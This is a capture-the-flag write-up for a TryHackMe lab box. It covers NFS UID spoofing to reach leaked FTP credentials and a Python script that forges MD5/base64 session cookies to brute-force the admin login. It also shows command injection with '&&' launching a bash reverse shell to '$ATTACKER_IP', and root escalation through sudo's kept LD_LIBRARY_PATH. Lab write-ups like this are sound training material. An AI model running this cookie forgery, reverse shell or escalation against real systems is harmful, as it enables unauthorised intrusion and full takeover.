# Hijack Writeup

This is a writeup for the Tryhackme challenge [Hijack](https://tryhackme.com/room/hijack)

## Enumeration

First, nmap as follows:

```sh
nmap --min-rate 4000 -p- 10.10.16.106
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-21 11:56 CEST
Nmap scan report for 10.10.16.106
Host is up (0.063s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
38490/tcp open  unknown
44511/tcp open  unknown
49338/tcp open  unknown
57526/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.56 seconds
```

Since there is an NFS I want to take a look at it.

```sh
showmount -e 10.10.16.106
Export list for 10.10.16.106:
/mnt/share *
```

So, there is a share I can mount in the following way

```sh
mkdir /tmp/nfsfiles
sudo mount -t nfs 10.10.16.106: /tmp/nfsfiles
```

A look at the file permissions tells me, that a user with uid 1003 created the
share. Therefore, a user with the same uid on the local attack machine, where
the share has been mounted, is needed to get permissions to open the directory.

```sh
ls -l nfsfiles/mnt/

drwx------ 2 1003 1003 4096 Aug  8 21:28 share
```

```sh
sudo useradd hijack -u 1003  -m -s /bin/bash
```

Now switch to the user and take a look at the inside of the share.

```sh
sudo su hijack

ls -la nfsfiles/mnt/share/
total 12
drwx------ 2 hijack hijack 4096 Aug  8 21:28 .
drwxr-xr-x 3 root   root   4096 Aug  8 21:28 ..
-rwx------ 1 hijack hijack   46 Aug  8 21:28 for_employees.txt
```

Taking a look at the file provides the following

```sh
cat nfsfiles/mnt/share/for_employees.txt

ftp creds :

ftpuser:XXXXXXXXXXXXXXXXXXXXXXXX
```

Next up, using the credentials on the ftp server

```sh
ftp ftpuser@10.10.16.106
Connected to 10.10.16.106.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||38678|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 .
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08 19:28 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08 19:28 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08 19:28 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08 19:28 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08 19:28 .profile
226 Directory send OK.
```

Two files are `.from_admin.txt` and
`.password_list.txt` are of special interest . The former file contains the following

```
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

The latter is a list of random passwords the admin seems to have created earlier.

## Exploitation

At first I tried to circumvent the rate limiting, which took a lot of time and
led nowhere in the end. The key is the `PHPSESSID` cookie, it looked a bit
suspicious so I tried to decode it for the user I created on the page.

```base64
d2h4OmE4ZjVmMTY3ZjQ0ZjQ5NjRlNmM5OThkZWU4MjcxMTBj
```

decoded to

```
whx:a8f5f167f44f4964e6c998dee827110c
```

That hash looked a lot like an md5 hash, so I compared it to the password I used

```sh
echo -n "asdasd" | md5sum
a8f5f167f44f4964e6c998dee827110c  -
```

After that I created a Python script to hash & encode the cookie before iterating
the list and in this way I got the correct password.

```python
import hashlib
import base64
import requests

URL = "http://10.10.16.106/administration.php"

with open ("./ftp/passwords_list.txt", 'r') as _f:
    data = [x.strip() for x in _f.readlines()]

r = requests.get(URL)
page_content = r.text
print(r)

for line in data:
    _hash = hashlib.md5(line.encode('utf-8')).hexdigest().encode('utf-8')
    concat_str = b'admin:' + _hash
    _b64hash = base64.b64encode(concat_str).decode()
    print(_b64hash)
    headers = { "Cookie": f"PHPSESSID={_b64hash}"}
    r = requests.get(URL, headers=headers)
    if len(r.text) > len(page_content):
        print("password: " + line)
        print("cookie: " + _b64hash)
        break
```

After login there is a `Service Status Checker` on the administration page. You
can see the status of services/daemons installed on the box of the challenge through
`systemctl status <command>`. My first impression was to just chain commands
through `;` like `ssh
; id`, but that ended in

> Command injection detected, please provide a service.

Most of the commonly used shells have boolean operators like `&&` and `||` as a
condition for the previous exit status code. For example in bash you can check
the status code of the last command that was executed via `echo $?`. That means `&&` is true if the previous command
would return a `0` otherwise `||` is true and the command afterwards will be
executed.
These operators are not blocked by the page, it is possible to chain commands
like this

```sh
sshd && bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
```

Catch the shell via `nc -lvnp 4444` and [upgrade
it](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

## Privilege Escalation

On the target `config.php` contains credentials for the user rick.

```php
 cat config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "XXXXXXXXXXXXXXXXXXX";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```

So, I switched to the user using `su rick` and got the first flag inside
`/home/rick/user.txt`. One of the first things to check on gained privileges is the current user's
permissions on  the availability of substituting other users, usually using
sudo.

```sh
su rick
Password: 

rick@Hijack:/var/www/html$ sudo -l
[sudo] password for rick: 
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

Checking permissions did provide the inability to write on any of the files that are contained in the command that can be run through sudo for user rick. That means,
the next best thing to concentrate on is `env_keep+=LD_LIBRARY_PATH`.
[Hacktricks' page on linux privilege
escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
contains [a section for
LD_LIBRARY_PATH](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path). 
I Compiled the library and preloaded it on the same line as the available sudo
command. Through this method I was able to spawn a root shell.

```sh
rick@Hijack:/tmp$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2

root@Hijack:/tmp#
```

The flag can be found inside the root directory

```sh
root@Hijack:/tmp# cat /root/root.txt

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

Happy Hacking!
